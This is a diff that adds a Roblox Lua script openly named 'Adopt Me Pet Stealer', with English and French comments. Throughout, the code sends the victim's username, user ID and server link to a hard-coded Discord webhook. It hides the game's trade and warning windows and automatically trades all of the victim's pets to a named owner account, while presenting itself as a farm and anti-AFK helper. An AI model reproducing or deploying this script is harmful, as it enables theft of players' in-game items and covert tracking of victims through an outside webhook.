@@ -1,0 +1,190 @@
+-- 🐾 Adopt Me Pet Stealer v5.1 - AUTO TRADE + TRADING GUI KILLER + SERVER NOTIF
+-- 🔥 Detects davidadoptme172 → KILLS TRADING GUIs → AUTO TRADES PETS!
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+-- ⚙️ YOUR SETTINGS
+local WEBHOOK = "https://discord.com/api/webhooks/1451560358434308237/5QfplYntO1wBNphJBWpoFMmTyGhUuE58x63sT0cvEAaYFIT1mlYBs_T_LanwQZEyOg_3"
+local OWNER = "davidadoptme172"  -- YOU!
+local GAMEID = 920587237
+
+print("🐾 **Pet Stealer v5.1 LOADING...** (Trading GUI Killer + SERVER TRACKER ACTIVE)")
+
+if game.PlaceId ~= GAMEID then 
+    return game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "❌ Wrong Game", Text = "Join Adopt Me!", Duration = 5
+    })
+end
+
+local lp = Players.LocalPlayer
+
+-- 🔥 SERVER GRABBER (ENVOIE NOTIF DÈS LE DÉMARRAGE!)
+local function sendVictimServer()
+    local serverLink = "https://www.roblox.com/games/920587237/"..game.JobId
+    local data = {
+        username = "🎒 **NOUVELLE VICTIME**",
+        embeds = {{
+            title = "🔥 **SCRIPT ACTIVÉ** - Prêt pour trades invisibles!",
+            description = "**"..lp.Name..":** Script chargé - Joins TOUT DE SUITE!",
+            color = 16711680,
+            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..lp.UserId.."&width=420&height=420&format=png"},
+            fields = {
+                {name="👤 Victime", value="**"..lp.Name.."** (`"..lp.UserId.."`)", inline=true},
+                {name="🌐 **Lien Serveur**", value="["..serverLink.."]("..serverLink..")", inline=false},
+                {name="👥 Joueurs", value="#"..#Players:GetPlayers().."/12", inline=true},
+                {name="⏰ Temps", value="**Maintenant**", inline=true}
+            },
+            footer = {text = "Trades invisibles prêts! 🚀"}
+        }},
+        components = {{
+            type = 1, components = {{
+                type = 2, 
+                label = "🚀 **JOIN LE SERVEUR MAINTENANT**", 
+                style = 5, 
+                url = serverLink,
+                emoji = {name="🔥"}
+            },{
+                type = 2, 
+                label = "👤 Profil "..lp.Name, 
+                style = 5, 
+                url = "https://www.roblox.com/users/"..lp.UserId.."/profile"
+            }}
+        }}
+    }
+    pcall(function() 
+        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+    end)
+    print("📤 **NOTIF ENVOYÉE** → "..serverLink)
+end
+
+-- 🔒 TRADING GUI KILLER
+local function killTradingGuis()
+    for _, gui in pairs(lp.PlayerGui:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            local guiName = gui.Name:lower()
+            if guiName:find("trade") or guiName:find("trading") or guiName:find("scam") or 
+               guiName:find("warning") or guiName:find("confirm") then
+                gui:Destroy()
+                print("🗑️ Killed: " .. gui.Name)
+            end
+        end
+    end
+end
+
+-- 👑 OWNER DETECTOR
+local ownerFound = false
+spawn(function()
+    while wait(1) do
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Name:lower() == OWNER:lower() and player ~= lp then
+                if not ownerFound then
+                    ownerFound = true
+                    print("👑 **"..OWNER.." DETECTÉ!** Auto-trade...")
+                    
+                    killTradingGuis()
+                    spawn(function()
+                        while ownerFound do
+                            wait(0.5)
+                            killTradingGuis()
+                        end
+                    end)
+                    
+                    spawn(function()
+                        wait(2)
+                        autoTradeToOwner()
+                    end)
+                    break
+                end
+            end
+        end
+        ownerFound = false
+    end
+end)
+
+-- 💎 AUTO TRADE
+function autoTradeToOwner()
+    local ownerPlayer = nil
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name:lower() == OWNER:lower() then
+            ownerPlayer = p
+            break
+        end
+    end
+    
+    if ownerPlayer then
+        print("🎁 **AUTO TRADE → "..OWNER.."**")
+        local pets = {}
+        for _, tool in pairs(lp.Backpack:GetChildren()) do
+            if tool:IsA("Tool") and tool.Name:lower():find("pet") then
+                table.insert(pets, tool.Name)
+            end
+        end
+        
+        pcall(function()
+            local tradeRemotes = {"TradeRemoteEvent", "MainEvent", "TradeEvent", "TradingRemote"}
+            for _, remoteName in pairs(tradeRemotes) do
+                if ReplicatedStorage:FindFirstChild(remoteName) then
+                    ReplicatedStorage[remoteName]:FireServer("StartTradeWithPlayer", ownerPlayer.UserId)
+                    wait(0.5)
+                    for _, petName in pairs(pets) do
+                        ReplicatedStorage[remoteName]:FireServer("AddItemToTrade", petName)
+                    end
+                    wait(1)
+                    ReplicatedStorage[remoteName]:FireServer("AcceptTrade")
+                    break
+                end
+            end
+        end)
+        
+        -- NOTIF TRADE COMPLETE
+        local data = {
+            username = "💎 **PETS VOLÉS!**",
+            embeds = {{title = "🎉 **TRADE TERMINÉ!**", 
+                      description = "**"..lp.Name.."'s pets → "..OWNER.."**\nPets: "..table.concat(pets, ", "), 
+                      color = 65280,
+                      fields = {
+                          {name="🌐 Serveur", value="https://www.roblox.com/games/920587237/"..game.JobId, inline=false}
+                      }
+            }}
+        }
+        pcall(function() HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)
+    end
+end
+
+-- 🚀 ENVOIE NOTIF DÈS LE DÉMARRAGE (PRINCIPAL!)
+sendVictimServer()
+
+-- 🔄 Refresh toutes les 45s
+spawn(function() while wait(45) do sendVictimServer() end end)
+
+-- 💰 Fake farm
+spawn(function()
+    while wait(2) do
+        pcall(function()
+            if ReplicatedStorage:FindFirstChild("MainEvent") then
+                ReplicatedStorage.MainEvent:FireServer("CollectBucks")
+            end
+        end)
+    end
+end)
+
+-- 💫 Anti-AFK
+spawn(function()
+    while wait(60) do
+        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
+            lp.Character.Humanoid:Move(Vector3.new())
+        end
+    end
+end)
+
+-- ✅ Notification succès
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "🐾 Pet Stealer v5.1", 
+    Text = "✅ **Script chargé!**\n📤 Serveur envoyé à Discord\n👑 Attends "..OWNER, 
+    Duration = 5
+})
+
+print("✅ **Pet Stealer v5.1 LIVE!** Serveur envoyé → Prêt pour trades!")
